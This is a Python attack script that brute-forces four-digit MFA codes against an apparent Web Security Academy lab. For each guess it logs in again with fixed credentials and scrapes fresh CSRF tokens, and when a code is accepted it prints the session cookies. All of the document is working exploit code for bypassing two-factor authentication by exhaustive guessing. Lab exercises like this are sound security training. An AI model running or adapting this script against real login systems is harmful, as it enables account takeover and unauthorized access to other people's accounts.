#!/usr/bin/python

import requests
from bs4 import BeautifulSoup

URL = "https://0add001404863a26806e2bf600b20082.web-security-academy.net"


def get_csrf_token(response):
    """Extract CSRF token from response."""
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_element = soup.find("input", {"name": "csrf"})
    return csrf_element["value"] if csrf_element else None


def generate_codes():
    """Generator for 4-digit MFA codes (0000 to 9999)."""
    for i in range(10000):
        yield f"{i:04d}"


def main():
    session = requests.Session()  # Reuse session

    for mfa_code in generate_codes():
        print(f"Testing code {mfa_code}", end="\r")  # Overwrites output for cleaner display

        try:
            # Step 1: Get login page & CSRF token
            response = session.get(f"{URL}/login")
            csrf_token = get_csrf_token(response)
            if not csrf_token:
                print("Error: CSRF token not found!")
                return

            # Step 2: Login
            login_payload = {"csrf": csrf_token, "username": "carlos", "password": "montoya"}
            login_response = session.post(f"{URL}/login", data=login_payload)

            if "Incorrect" in login_response.text:
                print("\nError: Login failed!")
                return

            # Step 3: Extract new CSRF token for MFA
            csrf_token = get_csrf_token(login_response)
            if not csrf_token:
                print("\nError: Failed to retrieve post-login CSRF token!")
                return

            # Step 4: Test MFA code
            mfa_payload = {"csrf": csrf_token, "mfa-code": mfa_code}
            mfa_response = session.post(f"{URL}/login2", data=mfa_payload)

            if "Incorrect" not in mfa_response.text:
                print(f"\nCode found: {mfa_code}")
                print("Cookies:", session.cookies.get_dict())
                break  # Stop if correct code is found

        except requests.RequestException as e:
            print(f"\nRequest error: {e}")
            break  # Exit if there's a network issue


if __name__ == "__main__":
    main()

